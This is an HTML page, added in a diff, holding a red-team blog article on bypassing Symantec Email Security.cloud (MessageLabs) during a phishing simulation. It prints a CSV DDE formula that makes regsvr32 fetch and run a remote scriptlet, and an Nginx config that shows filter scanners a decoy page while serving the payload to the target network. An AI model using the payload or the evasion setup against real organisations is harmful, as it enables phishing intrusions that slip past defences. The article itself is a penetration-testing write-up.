@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <title>Beyond Binary - TTP: Bypassing Symantec Email Security.cloud (AKA MessageLabs)</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="/css/style.css?7" />
+    <link rel="icon" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="shortcut" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="apple-touch-icon" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="canonical" href="https://beyondbinary.io/articles/bypassing-messagelabs/" />
+
+    <!--[if lt IE 9]>
+      <script src="/js/lib/html5shiv.js"></script>
+      <script src="/js/lib/ie8.js"></script>
+      <script src="/js/lib/respond.min.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <header>
+      <div class="container">
+        <div class="row">
+          <div class="table-row">
+            <div class="col-xs-4 col-sm-3 cell-xs">
+              <a href="/">
+                <img src="/images/beyond-binary-logo.png" srcset="/images/beyond-binary-logo@2x.png 2x" alt="" />
+              </a>
+            </div>
+            <div class="col-xs-8 col-sm-9 cell-xs text-right position-static">
+              <ul class="header-navigation">
+                <li><a href="/">home</a></li>
+                <li><a href="/about/">about</a></li>
+                <li><a href="/services/">services</a></li>
+                <li><a href="/articles/">articles</a></li>
+                <li><a href="/contact/">contact</a></li>
+                <li><a href="/media/">media</a></li>
+              </ul>
+              <svg id="menu-burger" width="64" height="64" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+                <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.0916789,20.818994 53.8166421,0"/>
+                <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.1969746,31.909063 53.8166424,0"/>
+                <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.0916788,42.95698 53.8166422,0"/>
+              </svg>
+            </div>
+          </div>
+        </div>
+      </div>
+      <img class="sticky-morph" src="/images/sticky-morph.png" srcset="/images/sticky-morph@2x.png 2x" alt="" />
+    </header>
+
+    <section>
+      <div class="container">
+        <h2 class="blue-line-through-md"><span>Articles &amp; News&nbsp;</span></h2>
+        <div class="row">
+          <article class="col-md-7">
+            <header>
+              <span class="date">01 August 2017</span>
+              <h1>TTP: Bypassing Symantec Email Security.cloud (MessageLabs)</h1>
+              <a class="tag" href="/tags/messagelabs/">MessageLabs</a>
+              <a class="tag" href="/tags/ttp/">TTP</a>
+            </header>
+
+            <h2>Overview</h2>
+
+            <p>During a recent <a href="/services/">Attack Simulation</a> against a high-profile client, Beyond Binary faced off against <a href="https://www.symantec.com/products/email-security-cloud">Symantec Email Security.cloud</a> (formerly <code>MessageLabs</code>) whilst conducting a variety of phishing campaigns. This was not the first time we had come up against cloud-based email security services, however our usual approaches to bypassing them didn't yield any fruit. Symantec was doing a relatively good job of stopping our phishes from making it to the end-user. As a result, we had to put some time into coming up with a way of getting around the filter.</p>
+
+            <p>This short article contains detail on how the MessageLabs filtering was bypassed. We hope you find it useful.</p>
+
+            <h2>First of all, Payloads!</h2>
+
+            <p>To simulate different attacks we wanted to utilise a number of different payloads, and the first one that was tried as a simple CSV file that contained a well-known <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx">DDE</a> attack vector to gain code execution. The aim was to invoke a custom payload, bypassing application whitelisting, resulting in active sessions on the target. The method we decided to go with in this instance was the (ab)use of <code>regsvr32</code>, a method <a href="http://subt0x10.blogspot.com.au/2017/04/bypass-application-whitelisting-script.html">researched and documented</a> by <a href="https://twitter.com/subTee">Casey Smith</a>. The required Scriptlet definition was hosted on several redirector servers within our C2 infrastructure.</p>
+
+            <p>The DDE entry inside the CSV file looked like this:</p>
+
+            <p><pre><code>=regsvr32|' /s /u /i:https://some.redirector.com/p/toteslegit.txt scrobj.dll'!A0</code></pre></p>
+
+            <p>Here we can see that <code>regsvr32</code> is the application that is being invoked, and the parameters passed to the invocation include a reference to the Scriptlet that is hosted externally. Note that the scriptlet does not need to have the <code>.sct</code> file extension, and hence our payloads contained an extention that was a little more innocuous.</p>
+
+            <p>The first few emails that were sent out to the target didn't appear to land in any inboxes within the organisation, implying that MessageLabs was filtering it out. So what was it about our payload that was causing the emails to be caught?</p>
+
+            <h2>MessageLabs' Email Parsing Behaviour</h2>
+
+            <p>The first step in uncovering the behaviour of MessageLabs was to set up a simple email without any attachments. This email contained a link to an external site controlled by Beyond Binary, and the aim was to determine if MessageLabs was validating links by navigating to them behind the scenes. The email was sent to an email address that didn't exist (to avoid users receiving useless emails), but MessageLabs still parsed the email. As expected, the link provided in the body of the email was validated and we were able to see the MessageLabs spider reach out to the web server and retrieve the content of the referenced URL. The email bounced, proving that the email was passed through to the client.</p>
+
+            <p>From here, the team took the step to re-add the attachment, but only include a link rather than the full DDE payload. The link was validated, and the email bounced again. We then found that adding the full DDE payload back into the attachment (with a URL that didn't contain a Scriptlet) yielded the same result. At this point we knew that URLs in attachments are followed, and that MessageLabs doesn't care about the DDE payload itself. On the surface, it looked like the body of the Scriptlet that was hosted on the external server is what caused the filter to kick in and block the email source. To summarise what we found:</p>
+
+            <ul>
+              <li>MessageLabs would open the email and follow all links in the body and in the attachments.</li>
+              <li>If any external URLs, referenced in the body or attachments, contained "malicious" content then the email was blocked.</li>
+              <li>If the content was deemed "clean", then the email would be sent to the client.</li>
+            </ul>
+
+            <p>Some other interesting behaviour was noted:</p>
+
+            <ul>
+              <li>Hits on external webservers were not coming from IP ranges owned by MessageLabs. This led us to believe that they were using a data centre ISP solution such as <a href="http://www.equinix.com.au/services/interconnection-connectivity/equinix-connect/">Equinix Connect</a> in an effort to blend in with normal traffic.</li>
+              <li>After sending the email, the hits on the web servers came almost immediately from MessageLabs. This made it simple to enumerate any IP addresses that were being utilised.</li>
+              <li>Subsequent emails containing the same attachment (same checksum) would not be scanned if sent within a given timeframe. The exact time frame was not important and so no time was spent attempting to discover it.</li>
+            </ul>
+
+            <h2>The Bypass Technique</h2>
+
+            <p>To help in understanding the set up, the following image shows a sample attack infrastructure configuration that can be used as part of an <a href="/services/">Attack Simulation</a> engagement. Infrastructure does vary from client to client, however this overview shows an approach that can fit various scenarios.</p>
+
+            <p class="img-full-screen-sm"><img src="/images/ttps01/01-infrastructure.png" alt="Infrastructure" /></p>
+
+            <p>At Beyond Binary, we utilise <a href="https://nginx.org/en/">Nginx</a> to serve as a web front-end for redirectors and C2 infrastructure. This serves a number of purposes:</p>
+
+            <ul>
+              <li>Redirecting traffic with Nginx is trivial and easy to configure based on a number of properties. Our C2 infrstructure (<a href="https://www.metasploit.com/">MSF</a> / <a href="https://www.powershellempire.com/">Empire</a> / $OTHER) can run as unprivileged users on non-standard ports, and Nginx handles the Internet-facing traffic and management of privileged ports. Nginx then routes relevant traffic to the C2 components behind the scenes.</li>
+              <li>Legitimate web pages can be hosted directly via Nginx, and rendered by default. This helps portray the host as a valid webserver in an effort to distract any Blue Team investigations.</li>
+            </ul>
+
+            <p>With Nginx already in place for the abov reasons, it made sense to make use of it to help deal with the MessageLabs problem. Now that we understood what was going on with the filtering and URL validation mechanism, we were able to devise a fairly simple solution:</p>
+
+            <ul>
+              <li>Determine a set of IP addresses that match the client infrastructure.</li>
+              <li>Any traffic hitting the redirectors from IP addresses that are not part of that address range can be considered as unintended traffic.</li>
+              <li>Requests to malicious Scriptlet URLs from outside the client IP range were redirected to harmless web pages.</li>
+              <li>Client requests are handled normally, and the payload is served as intended.</li>
+            </ul>
+
+            <p>The following snippet of code is the relevant section of the Nginx configuration file that demonstrates how IP-based filtering can be used to redirect unwanted requests away from payloads that are intended for the client:</p>
+
+            <p><pre><code>server {
+  # The usual server configuration stuff
+
+  ... snip ...
+
+  # Match the location URL wih that specified in the CSV
+  location ~ "^/p/(.*)" {
+    error_page 403 @badip;               # Redirector to @badip if disallowed
+    allow 172.16.0.0/16;                 # IP Netblock of the client network
+    allow xxx.xxx.xxx.xxx/yy;            # IP Netblock of any other network you want
+    deny all;                            # Block everyone else
+    proxy_pass http://1.1.1.1/p/$1;      # Redirect to the actual payload if ok
+  }
+
+  # Psuedo location that is invoked when the above locaton block results in a
+  # 403 Forbidden
+  location @badip {
+    # Redirect them to something that looks legit
+    return 301 $scheme://attackerdomain.com/index.html;
+  }
+
+  ... snip ...
+}</code></pre></p>
+
+            <p>With this configuration in place, the following behaviour was observed during the rest of the phishing campaigns:</p>
+            <ul>
+              <li>MessageLabs would request the Scriptlet URLs baked into the CSV attachments.</li>
+              <li>The requests would be from various IP addresses from all over the Internet, however none were within the client network.</li>
+              <li>The 301 redirect resulted in the MessageLabs spider making a second request to the location given in the configuration.</li>
+              <li>In many cases the second request for the page that was returned with the 301 redirect was made from a <u>different</u> IP address. This is a great indication that requests are being made by automated systems instead of normal people.</li>
+            </ul>
+
+            <h2>Conclusion</h2>
+
+            <p>With a little bit of analysis, and simple use of well-known tools, it is trivial to bypass cloud-based email filtering mechanisms such as MessageLabs. In some ways, it's even helpful to have tools like MessageLabs in place as they can be used as an "email delivery oracle" that indicates whether or not emails are accepted.</p>
+
+            <p>This post was written by <a href="https://twitter.com/ausjock">@AusJock</a>. However, please direct any questions, queries, doubtful points or death threats to <a href="https://twitter.com/thecolonial">@TheColonial</a>, he’ll be more than happy to accommodate.</p>
+          </article>
+
+          <aside class="col-md-4 col-md-offset-1">
+            <h2 class="blue-line-through-md"><span>Recent&nbsp;</span></h2>
+            <article>
+              <header>
+                <span class="date">01 August 2017</span>
+                <h4 class="text-header upper-case"><a href="/articles/bypassing-messagelabs/">TTP: Bypassing Symantec Email Security.cloud (MessageLabs)</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>During a recent Attack Simulation against a high-profile client, Beyond Binary faced off against Symantec Email Security.cloud (formerly MessageLabs) whilst conducting a variety of phishing campaigns. This was not the first time we had come up against cloud-based email security services, however our usual approaches to bypassing them didn't yield any fruit.</p>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/messagelabs/">MessageLabs</a>
+                <a class="tag" href="/tags/ttp/">TTP</a>
+              </footer>
+            </article>
+
+            <article>
+              <header>
+                <span class="date">10 March 2015</span>
+                <h4 class="text-header upper-case"><a href="/articles/seagate-nas-rce-response-analysis/">Opinion: Seagate's Analysis is Incorrect</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>On March 1st 2015 Beyond Binary went public with an advisory that disclosed 0day flaws in Seagate Business Storage 2-Bay NAS devices. Days later, Seagate responded to the advisory through a number of channels:</p>
+                <ul>
+                  <li>A direct email to Beyond Binary</li>
+                </ul>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/opinion/">Opinion</a>
+                <a class="tag" href="/tags/seagate/">Seagate</a>
+              </footer>
+            </article>
+
+            <article>
+              <header>
+                <span class="date">1 March 2015</span>
+                <h4 class="text-header upper-case"><a href="/articles/seagate-nas-rce/">Advisory: Seagate NAS Remote Code Execution Vulnerability</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>Seagate is a well-known vendor of hardware solutions, with products available worldwide. Its line of NAS products targeted at businesses is called Business Storage 2-Bay NAS. These can be found inside home and business networks, and in many cases they are publicly exposed.</p>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/advisory/">Advisory</a>
+                <a class="tag" href="/tags/cve/">CVE</a>
+                <a class="tag" href="/tags/exploit/">Exploit</a>
+                <a class="tag" href="/tags/seagate/">Seagate</a>
+              </footer>
+            </article>
+
+            <article>
+              <header>
+                <span class="date">4 February 2015</span>
+                <h4 class="text-header upper-case"><a href="/articles/teamcity-account-creation/">Advisory: TeamCity Account Creation</a></h4>
+              </header>
+              <div class="small-text text-black">
+                <p>TeamCity is a multi-platform continuous integration and build server product created by JetBrains. It is used by many development organisations to automate the build and deployment of software solutions as part of the development process. TeamCity is a very popular product and hence the number of installations, both public and private, is quite high.</p>
+              </div>
+              <footer>
+                <a class="tag" href="/tags/advisory/">Advisory</a>
+                <a class="tag" href="/tags/cve/">CVE</a>
+                <a class="tag" href="/tags/exploit/">Exploit</a>
+                <a class="tag" href="/tags/teamcity/">TeamCity</a>
+              </footer>
+            </article>
+
+            <p>
+            <a href="/articles/" class="button full-width-xs">View older articles</a>
+            </p>
+          </aside>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="container">
+        <div class="row">
+          <div class="table-row">
+            <div class="cell-sm col-sm-2 text-center">
+              <p>
+              <a href="/"><img src="/images/beyond-binary-logo.png" srcset="/images/beyond-binary-logo@2x.png 2x" alt="" /></a>
+              </p>
+            </div>
+
+            <div class="cell-sm col-sm-10">
+              <div class="row">
+                <div class="col-sm-11 col-sm-offset-1">
+                  <p><a href="https://twitter.com/BeyondBase2/status/892362430881214464">01 August 2017:&nbsp;</a>Some cloud-based email protection mechanisms are useful. But don’t rely on them, they can and will be bypassed without much effort!</p>
+                  <hr />
+                  <ul class="footer-navigation">
+                    <li><a href="/">home</a></li>
+                    <li><a href="/about/">about</a></li>
+                    <li><a href="/services/">services</a></li>
+                    <li><a href="/articles/">articles</a></li>
+                    <li><a href="/contact/">contact</a></li>
+                    <li><a href="/media/">media</a></li>
+                  </ul>
+                  <p class="small-text">
+                  &copy; Beyond Binary Pty Ltd - ABN 64 146 311 962
+                  </p>
+                </div>
+              </div>
+            </div>   
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <script src="/js/lib/jquery-1.11.3.min.js"></script>
+    <script src="/js/lib/jquery-ui.min.js"></script>
+    <script src="/js/lib/snap.svg-min.js"></script>
+    <script src="/js/equal-height.js"></script>
+    <script src="/js/menu-burger.js?3"></script>
+    <script src="/js/hero/hero.js?9"></script>
+    <script src="/js/hero/texts.js?9"></script>
+    <script src="/js/hero/bar.js?9"></script>
+    <script src="/js/hero/morph.js?9"></script>
+    <script src="/js/notification.js"></script>
+    <script src="/js/contact-form.js"></script>
+
+  </body>
